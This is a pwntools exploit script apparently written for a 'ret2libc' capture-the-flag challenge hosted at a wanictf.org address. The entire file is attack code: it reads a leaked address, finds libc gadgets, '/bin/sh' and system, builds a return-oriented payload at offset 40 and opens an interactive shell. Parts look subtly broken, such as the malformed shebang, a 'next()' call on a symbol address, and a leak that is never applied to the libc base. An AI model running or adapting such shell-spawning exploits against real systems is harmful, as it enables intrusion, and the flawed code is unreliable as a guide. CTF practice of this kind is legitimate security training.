#!user/bin/python3
from pwn import *
import sys

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

libc = ELF('./libc.so.6')
exe = ELF('./chall')

local=True
if(local):
    io = process(exe)
else:
    io = remote('ret2libc-pwn.wanictf.org', 9007)

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

io.recvuntil(b'+0x28')
leak = int(io.recvline().strip().ljust(8, b"\n")[2:20].decode(), 16)
log.info(f"{hex(leak)=}")

# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())
# gdb.attach(io, gdbscript=gdbscript)

pop_rdi = next(libc.search(asm("pop rdi; ret"), executable=True))
binsh = next(libc.search('/bin/sh\x00'))
ret = next(libc.search(asm("ret"), executable=True))
system = next(libc.sym['system'])

# 2nd payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        binsh,
        ret,
        system
    ]
})

# # send 2nd payload to get shell
io.sendlineafter(b'your input (max. 128 bytes) > ', payload)

io.interactive()